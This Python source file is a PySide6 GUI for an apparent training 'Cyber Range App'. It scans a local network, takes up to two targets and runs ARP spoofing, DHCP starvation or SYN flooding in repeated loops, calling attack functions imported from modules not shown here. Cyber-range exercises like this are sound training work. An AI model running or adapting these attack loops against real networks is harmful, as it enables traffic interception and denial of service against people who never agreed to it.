import sys, time, traceback
from PySide6.QtUiTools import QUiLoader
from PySide6.QtWidgets import QApplication, QMainWindow, QComboBox, QListWidgetItem, QVBoxLayout
from PySide6.QtCore import QFile, QObject, Slot, Signal, QRunnable, QThreadPool
from qt_material import *

from networkScanner.networkScanner import scanner
from manInTheMiddle.script import stopSpoof, spoofer
from DHCP_Starvation.DHCP_Starvation import getInterfaces, DHCPstarving
from SYN_flooding.synFlooding import  SYN_Flood


# Global variables
targets = []
scanning = False
attackingStatus = True

class WorkerSignals(QObject):

    finished = Signal()
    error = Signal(tuple)
    result = Signal(object)




class Worker(QRunnable):

    def __init__(self, fn, *args, **kwargs):
        super(Worker, self).__init__()

        # Store constructor arguments (re-used for processing)
        self.fn = fn
        self.args = args
        self.kwargs = kwargs
        self.signals = WorkerSignals()

    @Slot()
    def run(self):

        # Retrieve args/kwargs here; and fire processing using them
        try:
            result = self.fn(*self.args, **self.kwargs)
        except:
            traceback.print_exc()
            exctype, value = sys.exc_info()[:2]
            self.signals.error.emit((exctype, value, traceback.format_exc()))
        else:
            self.signals.result.emit(result)  # Return the result of the processing
        finally:
            self.signals.finished.emit()  # Done


# Functions to start and stop attacking 
def attacking(name) :
    global attackingStatus
    attackingStatus = True

    if (name == "ARP spoofing") :
        victim1IP,victim1Mac = targets[0].split(" : ")
        victim2IP,victim2Mac = targets[1].split(" : ")
        packets = 0
        while (attackingStatus) :
            spoofer(victim1IP,victim2IP,victim1Mac)
            spoofer(victim2IP,victim1IP,victim1Mac)
            printed = "[+] Sent packets "+ str(packets)
            print(printed)
            frame.main.console.append(printed)
            sys.stdout.flush()
            packets +=2
            time.sleep(2)

    if (name == "DHCP starving"):
        inter = interfaces.currentText()
        print("start attacking DHCP")
        nbPackets = 1
        while (attackingStatus) :
            if nbPackets%100 == 0:
                msg = "[+] sending packet "+str(nbPackets)
                print(msg)
                frame.main.console.append(msg)
            DHCPstarving(inter)
            nbPackets+=1

    if (name == "SYN flooding"):
        victim1IP,victim1Mac = targets[0].split(" : ")
        packets = 0
        while (attackingStatus) :
            SYN_Flood(victim1IP,80)
            printed = "[+] Sent packets "+ str(packets)
            print(printed)
            packets +=1    

def stopAttacking(name) :
    if (name == "ARP spoofing") :
        victim1IP,victim1Mac = targets[0].split(" : ")
        victim2IP,victim2Mac = targets[1].split(" : ")
        stopSpoof(victim1IP,victim2IP,victim1Mac, victim2Mac)
    if (name == "DHCP starving") :
        print("")
    if (name == "SYN flooding"):
        print("End attacking")


def scanning_complete():
    print("scanning COMPLETE!")

def scanning_output(output):
    listHosts = output
    #frame.main.listWidget.clear()
    print("Scanned list = ",listHosts)
    for host in listHosts:
        hostItem = host["ip"]+' : '+host["mac"]
        listWidgetItem = QListWidgetItem(hostItem)
        exist = False
        for i in range (frame.main.listWidget.count()):
            if frame.main.listWidget.item(i).text() == hostItem :
                exist = True 
        if exist == False:
            frame.main.listWidget.addItem(listWidgetItem)
        global scanning 
        scanning = False

def attacking_complete():
    print("attacking COMPLETE!")
    attackName = "None"

def attacking_output(output):
    print(output)

def stoppingAttack_complete():
    print("Stopping Attack COMPLETE!")

def stoppingAttack_output(output):
    print(output)


class RuntimeStylesheets(QMainWindow, QtStyleTools):
    def __init__(self):
        super().__init__()
        ui_file_name = "form.ui"
        ui_file = QFile(ui_file_name)
        self.main = QUiLoader().load(ui_file, self)
        ui_file.close()
        apply_stylesheet(app, theme='dark_teal.xml')

if __name__ == "__main__":
    app = QApplication(sys.argv)
    """
    ui_file_name = "form.ui"
    ui_file = QFile(ui_file_name)
    loader = QUiLoader()
    window = loader.load(ui_file)
    ui_file.close()
    """
    frame = RuntimeStylesheets()
    frame.main.console.setText("")
    frame.main.setWindowTitle("Cyber Range App")
    frame.main.logoensi.setStyleSheet("border-image: url(logo_ensi.png)  0 0 0 0 stretch stretch;")
    frame.main.cyberrange.setStyleSheet("border-image: url(cyberrange.png)  0 0 0 0 stretch stretch;")
    #frame.main.background.setStyleSheet("border-image: url(background.jpg) 0 0 0 0 stretch stretch;")


    attackName = "None"

    @Slot()
    def scan(scanning):
        if(scanning==False) :
            frame.main.console.append("Scanner begin")
            print("Scanner begin") 
            scanning = True
            #listHosts = scanner()

            scanThread = Worker(scanner)
            scanThread.signals.result.connect(scanning_output)
            scanThread.signals.finished.connect(scanning_complete)

            frame.main.threadpool.start(scanThread)
            

            
        else :
            frame.main.console.append("Already scanning !")
    @Slot()
    def addTargetClicked() :
        try :
            newtar = frame.main.listWidget.selectedItems()[0].text()
            if (len(targets) < 2) :
                if (newtar not in targets):
                    targets.append(newtar)
                    if (len(targets) == 1):
                        frame.main.target1.setText("Target 1\n" + newtar.split(" : ")[0] + "\n" + newtar.split(" : ")[1])
                    elif (len(targets) == 2) :
                        frame.main.target2.setText("Target 2\n" + newtar.split(" : ")[0] + "\n" + newtar.split(" : ")[1])
                else :
                    frame.main.console.append("Targets already added !")
            else : 
                frame.main.console.append("Number of targets exceeded !")
            

            print ("targets = ",targets)
            output = newtar + " added to your targets list"
            print (output)
            frame.main.console.append(output)
        except IndexError:
            frame.main.console.append("You didn't select a target")
    @Slot()
    def deleteTargetClicked() :
        if (len(targets)>0) :
            targets.clear()
            frame.main.console.append("Targets cleared")
            frame.main.target1.setText("Select Target 1")
            frame.main.target2.setText("Select Target 2")
        else :
            frame.main.console.append("List already cleared")
    @Slot()
    def startAttackClicked() :
        global attackName
        if (attackName == "None") : 
            attackName = frame.main.attacks.currentText()
            if (len(targets) == 2 or attackName == "DHCP starving"
                or (len(targets) == 1 and attackName == "SYN flooding")) :
                frame.main.console.append(attackName + " attack started")
                #attacking(attackName)
                
                print('startinng attacking .... '+ attackName)
                startAttackThread = Worker(attacking, attackName)
                startAttackThread.signals.result.connect(attacking_output)
                startAttackThread.signals.finished.connect(attacking_complete)

                frame.main.threadpool.start(startAttackThread)
            else :
                mess = "You have to select two targets first"
                print(mess)
                frame.main.console.append(mess)

        else :
            mess = "You should stop the running attack first"
            print(mess)
            frame.main.console.append(mess)

    @Slot()
    def stopAttackClicked() :
        global attackName
        if (attackName != "None") : 
            frame.main.console.append(attackName + " attack stopped")
            global attackingStatus
            attackingStatus = False
            
            #stopAttacking(attackName)

            stopAttackThread = Worker(stopAttacking, attackName)
            stopAttackThread.signals.result.connect(stoppingAttack_output)
            stopAttackThread.signals.finished.connect(stoppingAttack_complete)

            frame.main.threadpool.start(stopAttackThread)            
           
            attackName = "None"

        else :
            frame.main.console.append("You should start the attack first")
    
    @Slot()
    def attackSelected() :
        attackName = frame.main.attacks.currentText()
        print('attack selected is :' + attackName)
        vbox = QVBoxLayout()
        vbox.setObjectName('vbox')
        if attackName == 'ARP spoofing' :
            childs = frame.main.boxattacks.children()
            for child in childs:
                if child.objectName() in ['interfaces'] :
                    child.setParent(None)
                    childs = frame.main.boxattacks.children()
            

        if attackName == 'DHCP starving' :
            global interfaces
            interfaces = QComboBox()
            interfaces.setObjectName('interfaces')
            listInterfaces = getInterfaces()
            for inter in listInterfaces:
                if (inter not in ['lo', 'docker0']) :
                    interfaces.addItem(inter)

            childs = frame.main.boxattacks.children()
            exist=False
            for child in childs:
                if child.objectName() in ['vbox'] :
                    child.addWidget(interfaces)
                    exist=True
            if exist==False :                   
                vbox.addWidget(interfaces)
                frame.main.boxattacks.setLayout(vbox)

        if attackName == 'SYN flooding' :
            childs = frame.main.boxattacks.children()
            for child in childs:
                if child.objectName() in ['interfaces'] :
                    child.setParent(None)
                    childs = frame.main.boxattacks.children()

    frame.main.scan.clicked.connect(scan)
    frame.main.addTarget.clicked.connect(addTargetClicked)
    frame.main.deleteTarget.clicked.connect(deleteTargetClicked)
    frame.main.startAttack.clicked.connect(startAttackClicked)
    frame.main.stopAttack.clicked.connect(stopAttackClicked)
    frame.main.attacks.currentTextChanged.connect(attackSelected)
    

    frame.main.threadpool = QThreadPool()

    frame.main.show()

    sys.exit(app.exec_())